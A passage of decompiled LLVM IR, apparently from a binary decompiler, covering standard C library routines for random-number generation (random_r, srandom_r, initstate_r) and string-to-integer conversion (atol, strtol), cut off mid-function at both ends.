  uselistorder label %dec_label_pc_80512e1, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8051348 = load i32, i32* @ebx, align 4
  store i32 %v0_8051348, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8051351 = add i32 %tmp3, 12
  %v2_8051351 = inttoptr i32 %v1_8051351 to i32*
  %v3_8051351 = load i32, i32* %v2_8051351, align 4
  %v4_8051351 = icmp eq i32 %v3_8051351, 0
  %v1_8051355 = add i32 %tmp3, 8
  %v2_8051355 = inttoptr i32 %v1_8051355 to i32*
  %v3_8051355 = load i32, i32* %v2_8051355, align 4
  store i32 %v3_8051355, i32* %esi.global-to-local, align 4
  %v1_8051358 = icmp eq i1 %v4_8051351, false
  br i1 %v1_8051358, label %dec_label_pc_8051371, label %dec_label_pc_805135a

dec_label_pc_805135a:                             ; preds = %entry
  %v2_805135a = inttoptr i32 %v3_8051355 to i32*
  %v3_805135a = load i32, i32* %v2_805135a, align 4
  %v5_805135a = mul i32 %v3_805135a, 1103515245
  %v1_8051360 = add i32 %v5_805135a, 12345
  %v1_8051365 = urem i32 %v1_8051360, -2147483648
  store i32 %v1_8051365, i32* %eax.global-to-local, align 4
  store i32 %v1_8051365, i32* %v2_805135a, align 4
  %v0_805136c = load i32, i32* %eax.global-to-local, align 4
  %v1_805136c = load i32, i32* %ebp.global-to-local, align 4
  %v2_805136c = inttoptr i32 %v1_805136c to i32*
  store i32 %v0_805136c, i32* %v2_805136c, align 4
  br label %dec_label_pc_805139c

dec_label_pc_8051371:                             ; preds = %entry
  %v1_8051371 = add i32 %tmp3, 4
  %v2_8051371 = inttoptr i32 %v1_8051371 to i32*
  %v3_8051371 = load i32, i32* %v2_8051371, align 4
  store i32 %v3_8051371, i32* %ecx.global-to-local, align 4
  %v2_8051374 = load i32, i32* %arg1, align 4
  store i32 %v2_8051374, i32* %edx.global-to-local, align 4
  %v1_8051376 = add i32 %tmp3, 24
  %v2_8051376 = inttoptr i32 %v1_8051376 to i32*
  %v3_8051376 = load i32, i32* %v2_8051376, align 4
  store i32 %v3_8051376, i32* %edi.global-to-local, align 4
  %v1_8051379 = inttoptr i32 %v3_8051371 to i32*
  %v2_8051379 = load i32, i32* %v1_8051379, align 4
  store i32 %v2_8051379, i32* %eax.global-to-local, align 4
  %v1_805137b = inttoptr i32 %v2_8051374 to i32*
  %v2_805137b = load i32, i32* %v1_805137b, align 4
  %v4_805137b = add i32 %v2_805137b, %v2_8051379
  store i32 %v4_805137b, i32* %v1_805137b, align 4
  %v0_805137d = load i32, i32* %edx.global-to-local, align 4
  %v1_805137d = inttoptr i32 %v0_805137d to i32*
  %v2_805137d = load i32, i32* %v1_805137d, align 4
  %v1_805137f = add i32 %v0_805137d, 4
  store i32 %v1_805137f, i32* %edx.global-to-local, align 4
  %v2_8051382 = udiv i32 %v2_805137d, 2
  %v1_8051384 = load i32, i32* %edi.global-to-local, align 4
  %v7_8051384 = icmp ult i32 %v1_805137f, %v1_8051384
  %v1_8051386 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051386 = inttoptr i32 %v1_8051386 to i32*
  store i32 %v2_8051382, i32* %v2_8051386, align 4
  %v0_8051389 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051389 = add i32 %v0_8051389, 4
  store i32 %v1_8051389, i32* %eax.global-to-local, align 4
  br i1 %v7_8051384, label %dec_label_pc_8051392, label %dec_label_pc_805138e

dec_label_pc_805138e:                             ; preds = %dec_label_pc_8051371
  %v0_805138e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805138e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051397

dec_label_pc_8051392:                             ; preds = %dec_label_pc_8051371
  %v1_8051392 = load i32, i32* %edi.global-to-local, align 4
  %v7_8051392 = icmp ult i32 %v1_8051389, %v1_8051392
  %v1_8051394 = icmp eq i1 %v7_8051392, false
  %v3_8051394 = load i32, i32* %esi.global-to-local, align 4
  %v4_8051394 = select i1 %v1_8051394, i32 %v3_8051394, i32 %v1_8051389
  store i32 %v4_8051394, i32* %eax.global-to-local, align 4
  %v0_8051397.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051397

dec_label_pc_8051397:                             ; preds = %dec_label_pc_805138e, %dec_label_pc_8051392
  %v0_8051397 = phi i32 [ %v0_805138e, %dec_label_pc_805138e ], [ %v0_8051397.pre, %dec_label_pc_8051392 ]
  %v1_8051397 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051397 = inttoptr i32 %v1_8051397 to i32*
  store i32 %v0_8051397, i32* %v2_8051397, align 4
  %v0_8051399 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051399 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051399 = add i32 %v1_8051399, 4
  %v3_8051399 = inttoptr i32 %v2_8051399 to i32*
  store i32 %v0_8051399, i32* %v3_8051399, align 4
  br label %dec_label_pc_805139c

dec_label_pc_805139c:                             ; preds = %dec_label_pc_805135a, %dec_label_pc_8051397
  %v2_805139c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805139c, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8051365, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_805139c, { 1, 0 }
  uselistorder label %dec_label_pc_8051397, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_80513a3 = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80513a7 = load i32, i32* @edi, align 4
  %v0_80513a8 = load i32, i32* @esi, align 4
  %v0_80513a9 = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_80513b5 = add i32 %tmp14, 12
  %v2_80513b5 = inttoptr i32 %v1_80513b5 to i32*
  %v3_80513b5 = load i32, i32* %v2_80513b5, align 4
  store i32 %v3_80513b5, i32* %ecx.global-to-local, align 4
  %v6_80513bb = icmp ugt i32 %v3_80513b5, 4
  br i1 %v6_80513bb, label %dec_label_pc_8051435, label %dec_label_pc_80513bd

dec_label_pc_80513bd:                             ; preds = %entry
  %v1_80513bd = add i32 %tmp14, 8
  %v2_80513bd = inttoptr i32 %v1_80513bd to i32*
  %v3_80513bd = load i32, i32* %v2_80513bd, align 4
  store i32 %v3_80513bd, i32* %ebx.global-to-local, align 4
  %v1_80513c0 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_80513c7 = select i1 %v1_80513c0, i32 1, i32 %arg1
  store i32 %v3_80513c7, i32* %edx.global-to-local, align 4
  %v1_80513ca = icmp eq i32 %v3_80513b5, 0
  %v2_80513cc = inttoptr i32 %v3_80513bd to i32*
  store i32 %v3_80513c7, i32* %v2_80513cc, align 4
  br i1 %v1_80513ca, label %dec_label_pc_8051433, label %dec_label_pc_80513d0

dec_label_pc_80513d0:                             ; preds = %dec_label_pc_80513bd
  %v0_80513d0 = load i32, i32* @esi, align 4
  %v1_80513d0 = add i32 %v0_80513d0, 16
  %v2_80513d0 = inttoptr i32 %v1_80513d0 to i32*
  %v3_80513d0 = load i32, i32* %v2_80513d0, align 4
  store i32 %v3_80513d0, i32* %eax.global-to-local, align 4
  %v0_80513d3 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80513d3, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_80513da = sext i32 %v3_80513d0 to i64
  store i64 %v4_80513da, i64* %stack_var_-40, align 8
  %v5_805141032 = icmp sgt i32 %v3_80513d0, 1
  br i1 %v5_805141032, label %dec_label_pc_80513df, label %dec_label_pc_8051412

dec_label_pc_80513df:                             ; preds = %dec_label_pc_80513d0, %dec_label_pc_80513df.dec_label_pc_80513df_crit_edge
  %v0_8051407 = phi i32 [ %v0_8051407.pre, %dec_label_pc_80513df.dec_label_pc_80513df_crit_edge ], [ %v0_80513d3, %dec_label_pc_80513d0 ]
  %v0_80513df = load i32, i32* %edx.global-to-local, align 4
  %v1_80513e6 = ashr i32 %v0_80513df, 31
  %v2_80513e7 = zext i32 %v0_80513df to i64
  %v4_80513e7 = zext i32 %v1_80513e6 to i64
  %v5_80513e7 = mul nuw i64 %v4_80513e7, 4294967296
  %v6_80513e7 = or i64 %v5_80513e7, %v2_80513e7
  %v8_80513e7 = sdiv i64 %v6_80513e7, 127773
  %v9_80513e7 = trunc i64 %v8_80513e7 to i32
  %v10_80513e7 = srem i64 %v6_80513e7, 127773
  %v3_80513ed = mul nsw i64 %v10_80513e7, 16807
  %v4_80513ed = trunc i64 %v3_80513ed to i32
  %tmp24 = mul i32 %v9_80513e7, -2836
  %v2_80513f9 = add i32 %v4_80513ed, %tmp24
  %v1_80513fb = add i32 %v2_80513f9, 1
  %v6_80513fb = xor i32 %v2_80513f9, -2147483648
  %v7_80513fb = xor i32 %v1_80513fb, %v2_80513f9
  %v8_80513fb = and i32 %v7_80513fb, %v6_80513fb
  %v9_80513fb = icmp slt i32 %v8_80513fb, 0
  %v10_80513fb = icmp eq i32 %v1_80513fb, 0
  %v11_80513fb = icmp slt i32 %v1_80513fb, 0
  %v1_80513fe = add i32 %v2_80513f9, 2147483647
  store i32 %v1_80513fe, i32* %eax.global-to-local, align 4
  %v3_8051404 = icmp ne i1 %v11_80513fb, %v9_80513fb
  %v4_8051404 = or i1 %v10_80513fb, %v3_8051404
  %v7_8051404 = select i1 %v4_8051404, i32 %v1_80513fe, i32 %v2_80513f9
  store i32 %v7_8051404, i32* %edx.global-to-local, align 4
  %v1_8051407 = add i32 %v0_8051407, 4
  store i32 %v1_8051407, i32* %ecx.global-to-local, align 4
  %v2_805140a = inttoptr i32 %v1_8051407 to i32*
  store i32 %v7_8051404, i32* %v2_805140a, align 4
  %v0_805140c = load i32, i32* @edi, align 4
  %v1_805140c = add i32 %v0_805140c, 1
  store i32 %v1_805140c, i32* @edi, align 4
  %v3_805140d.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_805140d.pre to i32
  %v5_8051410 = icmp slt i32 %v1_805140c, %extract.t11
  br i1 %v5_8051410, label %dec_label_pc_80513df.dec_label_pc_80513df_crit_edge, label %dec_label_pc_805140d.dec_label_pc_8051412_crit_edge

dec_label_pc_80513df.dec_label_pc_80513df_crit_edge: ; preds = %dec_label_pc_80513df
  %v0_8051407.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80513df

dec_label_pc_805140d.dec_label_pc_8051412_crit_edge: ; preds = %dec_label_pc_80513df
  %v0_8051412.pre = load i32, i32* @esi, align 4
  %v0_8051415.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051412

dec_label_pc_8051412:                             ; preds = %dec_label_pc_805140d.dec_label_pc_8051412_crit_edge, %dec_label_pc_80513d0
  %v0_8051415 = phi i32 [ %v0_8051415.pre, %dec_label_pc_805140d.dec_label_pc_8051412_crit_edge ], [ %v0_80513d3, %dec_label_pc_80513d0 ]
  %v0_8051412 = phi i32 [ %v0_8051412.pre, %dec_label_pc_805140d.dec_label_pc_8051412_crit_edge ], [ %v0_80513d0, %dec_label_pc_80513d0 ]
  %v1_8051412 = add i32 %v0_8051412, 20
  %v2_8051412 = inttoptr i32 %v1_8051412 to i32*
  %v3_8051412 = load i32, i32* %v2_8051412, align 4
  store i32 %v3_8051412, i32* %eax.global-to-local, align 4
  %v2_8051415 = add i32 %v0_8051412, 4
  %v3_8051415 = inttoptr i32 %v2_8051415 to i32*
  store i32 %v0_8051415, i32* %v3_8051415, align 4
  %v0_8051418 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051418 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051418 = mul i32 %v1_8051418, 4
  %v3_8051418 = add i32 %v2_8051418, %v0_8051418
  store i32 %v3_8051418, i32* %eax.global-to-local, align 4
  %v1_805141b = load i32, i32* @esi, align 4
  %v2_805141b = inttoptr i32 %v1_805141b to i32*
  store i32 %v3_8051418, i32* %v2_805141b, align 4
  %v3_805141d = load i64, i64* %stack_var_-40, align 8
  %v6_805141d = mul nsw i64 %v3_805141d, 10
  %v7_805141d = trunc i64 %v6_805141d to i32
  %v2_8051423 = ptrtoint i32* %stack_var_-20 to i32
  %v1_805143025 = add i32 %v7_805141d, -1
  %v9_805143029 = icmp slt i32 %v1_805143025, 0
  store i32 %v1_805143025, i32* @ebx, align 4
  %v1_805143130 = icmp eq i1 %v9_805143029, false
  br i1 %v1_805143130, label %dec_label_pc_8051423, label %dec_label_pc_8051433

dec_label_pc_8051423:                             ; preds = %dec_label_pc_8051412, %dec_label_pc_8051423
  store i32 %v2_8051423, i32* %eax.global-to-local, align 4
  %v0_8051428 = load i32, i32* @esi, align 4
  %v2_8051429 = inttoptr i32 %v0_8051428 to i32*
  %v3_8051429 = call i32 @__GI_random_r(i32* %v2_8051429, i32 %v2_8051423)
  store i32 %v0_8051428, i32* %eax.global-to-local, align 4
  store i32 %v2_8051423, i32* %edx.global-to-local, align 4
  %v0_8051430.pre = load i32, i32* @ebx, align 4
  %v1_8051430 = add i32 %v0_8051430.pre, -1
  %v9_8051430 = icmp slt i32 %v1_8051430, 0
  store i32 %v1_8051430, i32* @ebx, align 4
  %v1_8051431 = icmp eq i1 %v9_8051430, false
  br i1 %v1_8051431, label %dec_label_pc_8051423, label %dec_label_pc_8051433

dec_label_pc_8051433:                             ; preds = %dec_label_pc_8051412, %dec_label_pc_8051423, %dec_label_pc_80513bd
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051435

dec_label_pc_8051435:                             ; preds = %entry, %dec_label_pc_8051433
  %v0_805143c = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8051433 ]
  store i32 %v0_80513a9, i32* @ebx, align 4
  store i32 %v0_80513a8, i32* @esi, align 4
  store i32 %v0_80513a7, i32* @edi, align 4
  store i32 %v0_80513a3, i32* @ebp, align 4
  ret i32 %v0_805143c

; uselistorder directives
  uselistorder i32 %v1_8051430, { 1, 0 }
  uselistorder i32 %v0_8051412, { 1, 0 }
  uselistorder i32 %v1_80513fb, { 2, 1, 0 }
  uselistorder i32 %v2_80513f9, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_80513d3, { 1, 0, 2 }
  uselistorder i32 %v3_80513b5, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_8051435, { 1, 0 }
  uselistorder label %dec_label_pc_8051433, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051423, { 1, 0 }
  uselistorder label %dec_label_pc_80513df, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_805143f = load i32, i32* @esi, align 4
  %v0_8051440 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_8051461, label %dec_label_pc_8051455

dec_label_pc_8051455:                             ; preds = %entry
  %v2_8051455 = icmp ult i32 %arg3, 256
  %v1_805145c = select i1 %v2_8051455, i32 5, i32 4
  store i32 %v1_805145c, i32* @ebx, align 4
  br label %dec_label_pc_8051477

dec_label_pc_8051461:                             ; preds = %entry
  %v6_8051464 = icmp ugt i32 %arg3, 31
  br i1 %v6_8051464, label %dec_label_pc_805146f, label %dec_label_pc_8051466

dec_label_pc_8051466:                             ; preds = %dec_label_pc_8051461
  store i32 0, i32* @ebx, align 4
  %v6_805146b = icmp ugt i32 %arg3, 7
  br i1 %v6_805146b, label %dec_label_pc_8051477, label %dec_label_pc_80514c7

dec_label_pc_805146f:                             ; preds = %dec_label_pc_8051461
  %v2_805146f = icmp ult i32 %arg3, 64
  %v1_8051474 = select i1 %v2_805146f, i32 3, i32 2
  store i32 %v1_8051474, i32* @ebx, align 4
  br label %dec_label_pc_8051477

dec_label_pc_8051477:                             ; preds = %dec_label_pc_8051466, %dec_label_pc_8051455, %dec_label_pc_805146f
  %v0_8051481 = phi i32 [ 0, %dec_label_pc_8051466 ], [ %v1_805145c, %dec_label_pc_8051455 ], [ %v1_8051474, %dec_label_pc_805146f ]
  %v1_8051477 = mul nuw nsw i32 %v0_8051481, 4
  %v2_8051477 = add i32 %v1_8051477, ptrtoint (i32* @global_var_80573b4.205 to i32)
  %v3_8051477 = inttoptr i32 %v2_8051477 to i32*
  %v4_8051477 = load i32, i32* %v3_8051477, align 4
  store i32 %v4_8051477, i32* %eax.global-to-local, align 4
  %v1_805147e = add i32 %tmp7, 4
  store i32 %v1_805147e, i32* @esi, align 4
  %v2_8051481 = add i32 %v1_8051477, ptrtoint (i32* @global_var_80573a0.206 to i32)
  %v3_8051481 = inttoptr i32 %v2_8051481 to i32*
  %v4_8051481 = load i32, i32* %v3_8051481, align 4
  store i32 %v4_8051481, i32* %edx.global-to-local, align 4
  %v2_8051488 = add i32 %arg4, 12
  %v3_8051488 = inttoptr i32 %v2_8051488 to i32*
  store i32 %v0_8051481, i32* %v3_8051488, align 4
  %v0_805148b = load i32, i32* @esi, align 4
  %v1_805148b = load i32, i32* @edi, align 4
  %v2_805148b = add i32 %v1_805148b, 8
  %v3_805148b = inttoptr i32 %v2_805148b to i32*
  store i32 %v0_805148b, i32* %v3_805148b, align 4
  %v0_805148e = load i32, i32* %eax.global-to-local, align 4
  %v1_805148e = load i32, i32* @edi, align 4
  %v2_805148e = add i32 %v1_805148e, 16
  %v3_805148e = inttoptr i32 %v2_805148e to i32*
  store i32 %v0_805148e, i32* %v3_805148e, align 4
  %v0_8051491 = load i32, i32* @esi, align 4
  %v1_8051491 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051491 = mul i32 %v1_8051491, 4
  %v3_8051491 = add i32 %v2_8051491, %v0_8051491
  store i32 %v3_8051491, i32* %eax.global-to-local, align 4
  %v0_8051494 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051494 = load i32, i32* @edi, align 4
  %v2_8051494 = add i32 %v1_8051494, 20
  %v3_8051494 = inttoptr i32 %v2_8051494 to i32*
  store i32 %v0_8051494, i32* %v3_8051494, align 4
  %v0_8051497 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051497 = load i32, i32* @edi, align 4
  %v2_8051497 = add i32 %v1_8051497, 24
  %v3_8051497 = inttoptr i32 %v2_8051497 to i32*
  store i32 %v0_8051497, i32* %v3_8051497, align 4
  %v0_805149a = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_805149f = inttoptr i32 %v0_805149a to i32*
  %v3_805149f = call i32 @srandom_r(i32 %arg1, i32* %v2_805149f)
  %v0_80514a4 = load i32, i32* @ebp, align 4
  %v1_80514a4 = inttoptr i32 %v0_80514a4 to i32*
  store i32 0, i32* %v1_80514a4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80514af = load i32, i32* @ebx, align 4
  %v1_80514af = icmp eq i32 %v0_80514af, 0
  br i1 %v1_80514af, label %dec_label_pc_80514e0, label %dec_label_pc_80514b3

dec_label_pc_80514b3:                             ; preds = %dec_label_pc_8051477
  %v0_80514b3 = load i32, i32* @edi, align 4
  %v1_80514b3 = add i32 %v0_80514b3, 4
  %v2_80514b3 = inttoptr i32 %v1_80514b3 to i32*
  %v3_80514b3 = load i32, i32* %v2_80514b3, align 4
  %v1_80514b6 = load i32, i32* @esi, align 4
  %v2_80514b6 = sub i32 %v3_80514b3, %v1_80514b6
  %v2_80514b8 = sdiv i32 %v2_80514b6, 4
  %v3_80514bb = mul i32 %v2_80514b8, 5
  %v2_80514be = add i32 %v3_80514bb, %v0_80514af
  %v1_80514c0 = load i32, i32* @ebp, align 4
  %v2_80514c0 = inttoptr i32 %v1_80514c0 to i32*
  store i32 %v2_80514be, i32* %v2_80514c0, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80514e0

dec_label_pc_80514c7:                             ; preds = %dec_label_pc_8051466
  %v1_80514c7 = call i32 @__errno_location(i32 %v0_8051440)
  store i32 %v1_80514c7, i32* %eax.global-to-local, align 4
  %v1_80514cc = inttoptr i32 %v1_80514c7 to i32*
  store i32 22, i32* %v1_80514cc, align 4
  %v0_80514d2 = load i32, i32* %stack_var_-36, align 4
  %v1_80514d2 = call i32 @__errno_location(i32 %v0_80514d2)
  %v1_80514d7 = inttoptr i32 %v1_80514d2 to i32*
  store i32 22, i32* %v1_80514d7, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80514e0

dec_label_pc_80514e0:                             ; preds = %dec_label_pc_8051477, %dec_label_pc_80514b3, %dec_label_pc_80514c7
  %v0_80514e7 = phi i32 [ 0, %dec_label_pc_8051477 ], [ 0, %dec_label_pc_80514b3 ], [ -1, %dec_label_pc_80514c7 ]
  store i32 %v0_805143f, i32* @esi, align 4
  ret i32 %v0_80514e7

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80514e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051477, { 2, 0, 1 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80514f3 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_80514f3
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805150d = inttoptr i32 %arg1 to i8*
  %v5_805150d = call i32 @_stdlib_strto_l(i8* %v4_805150d, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_805150d
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805151b = load i32, i32* @ebx, align 4
  store i32 %v0_805151b, i32* %stack_var_-16, align 4
  %v4_805151f = ptrtoint i8* %arg1 to i32
  store i32 %v4_805151f, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_8051527 = load i32, i32* @global_var_8058218, align 8
  store i32 %v0_8051527, i32* %edx.global-to-local, align 4
  store i32 %v4_805151f, i32* %ebx.global-to-local, align 4
  %v2_805153240 = load i8, i8* %arg1, align 1
  %v3_805153241 = sext i8 %v2_805153240 to i32
  store i32 %v3_805153241, i32* %eax.global-to-local, align 4
  %v2_805153542 = mul nsw i32 %v3_805153241, 2
  %v3_805153543 = add i32 %v2_805153542, %v0_8051527
  %v4_805153544 = inttoptr i32 %v3_805153543 to i8*
  %v5_805153545 = load i8, i8* %v4_805153544, align 1
  %v6_805153546 = and i8 %v5_805153545, 32
  %v7_805153547 = icmp eq i8 %v6_805153546, 0
  %v1_805153948 = icmp eq i1 %v7_805153547, false
  br i1 %v1_805153948, label %dec_label_pc_8051531, label %dec_label_pc_805153b

dec_label_pc_8051531:                             ; preds = %entry, %dec_label_pc_8051531
  %v0_805153149 = phi i32 [ %v1_8051531, %dec_label_pc_8051531 ], [ %v4_805151f, %entry ]
  %v1_8051531 = add i32 %v0_805153149, 1
  store i32 %v1_8051531, i32* %ebx.global-to-local, align 4
  %v1_8051532 = inttoptr i32 %v1_8051531 to i8*
  %v2_8051532 = load i8, i8* %v1_8051532, align 1
  %v3_8051532 = sext i8 %v2_8051532 to i32
  store i32 %v3_8051532, i32* %eax.global-to-local, align 4
  %v2_8051535 = mul nsw i32 %v3_8051532, 2
  %v3_8051535 = add i32 %v2_8051535, %v0_8051527
  %v4_8051535 = inttoptr i32 %v3_8051535 to i8*
  %v5_8051535 = load i8, i8* %v4_8051535, align 1
  %v6_8051535 = and i8 %v5_8051535, 32
  %v7_8051535 = icmp eq i8 %v6_8051535, 0
  %v1_8051539 = icmp eq i1 %v7_8051535, false
  br i1 %v1_8051539, label %dec_label_pc_8051531, label %dec_label_pc_805153b

dec_label_pc_805153b:                             ; preds = %dec_label_pc_8051531, %entry
  %v0_8051531.lcssa = phi i32 [ %v4_805151f, %entry ], [ %v1_8051531, %dec_label_pc_8051531 ]
  %v2_8051532.lcssa = phi i8 [ %v2_805153240, %entry ], [ %v2_8051532, %dec_label_pc_8051531 ]
  %v3_8051532.lcssa = phi i32 [ %v3_805153241, %entry ], [ %v3_8051532, %dec_label_pc_8051531 ]
  %tmp36 = trunc i32 %arg4 to i8
  %v9_805153b = icmp eq i8 %v2_8051532.lcssa, 43
  br i1 %v9_805153b, label %dec_label_pc_8051556, label %dec_label_pc_8051540

dec_label_pc_8051540:                             ; preds = %dec_label_pc_805153b
  %v9_8051540 = icmp eq i8 %v2_8051532.lcssa, 45
  %v1_8051548 = icmp eq i1 %v9_8051540, false
  br i1 %v1_8051548, label %dec_label_pc_8051557, label %dec_label_pc_8051556

dec_label_pc_8051556:                             ; preds = %dec_label_pc_805153b, %dec_label_pc_8051540
  %storemerge4 = phi i8 [ 1, %dec_label_pc_8051540 ], [ 0, %dec_label_pc_805153b ]
  %v1_8051556 = add i32 %v0_8051531.lcssa, 1
  store i32 %v1_8051556, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051557

dec_label_pc_8051557:                             ; preds = %dec_label_pc_8051540, %dec_label_pc_8051556
  %v0_8051569 = phi i32 [ %v1_8051556, %dec_label_pc_8051556 ], [ %v0_8051531.lcssa, %dec_label_pc_8051540 ]
  %stack_var_-18.0 = phi i8 [ %storemerge4, %dec_label_pc_8051556 ], [ 0, %dec_label_pc_8051540 ]
  %v1_8051557 = and i32 %arg3, -17
  %v2_8051557 = icmp eq i32 %v1_8051557, 0
  %v1_805155f = icmp eq i1 %v2_8051557, false
  br i1 %v1_805155f, label %dec_label_pc_8051585, label %dec_label_pc_8051561

dec_label_pc_8051561:                             ; preds = %dec_label_pc_8051557
  %v1_8051561 = add i32 %arg3, 10
  store i32 %v1_8051561, i32* %esi.global-to-local, align 4
  %v1_8051564 = inttoptr i32 %v0_8051569 to i8*
  %v2_8051564 = load i8, i8* %v1_8051564, align 1
  %v8_8051564 = icmp eq i8 %v2_8051564, 48
  %v1_8051567 = icmp eq i1 %v8_8051564, false
  br i1 %v1_8051567, label %dec_label_pc_805157a, label %dec_label_pc_8051569

dec_label_pc_8051569:                             ; preds = %dec_label_pc_8051561
  %v1_8051569 = add i32 %v0_8051569, 1
  store i32 %v1_8051569, i32* %ebx.global-to-local, align 4
  %v1_805156a = add i32 %arg3, 8
  store i32 %v1_805156a, i32* %esi.global-to-local, align 4
  %v1_805156d = inttoptr i32 %v1_8051569 to i8*
  %v2_805156d = load i8, i8* %v1_805156d, align 1
  %v2_8051571 = or i8 %v2_805156d, 32
  %v7_8051571 = zext i8 %v2_8051571 to i32
  %v9_8051571 = and i32 %v3_8051532.lcssa, -256
  %v10_8051571 = or i32 %v7_8051571, %v9_8051571
  store i32 %v10_8051571, i32* %eax.global-to-local, align 4
  %v10_8051573 = icmp eq i8 %v2_8051571, 120
  %v1_8051575 = icmp eq i1 %v10_8051573, false
  br i1 %v1_8051575, label %dec_label_pc_805157a, label %dec_label_pc_8051577

dec_label_pc_8051577:                             ; preds = %dec_label_pc_8051569
  %v2_8051577 = mul i32 %v1_805156a, 2
  store i32 %v2_8051577, i32* %esi.global-to-local, align 4
  %v1_8051579 = add i32 %v0_8051569, 2
  store i32 %v1_8051579, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805157a

dec_label_pc_805157a:                             ; preds = %dec_label_pc_8051569, %dec_label_pc_8051561, %dec_label_pc_8051577
  %v0_80515a212 = phi i32 [ %v1_8051569, %dec_label_pc_8051569 ], [ %v0_8051569, %dec_label_pc_8051561 ], [ %v1_8051579, %dec_label_pc_8051577 ]
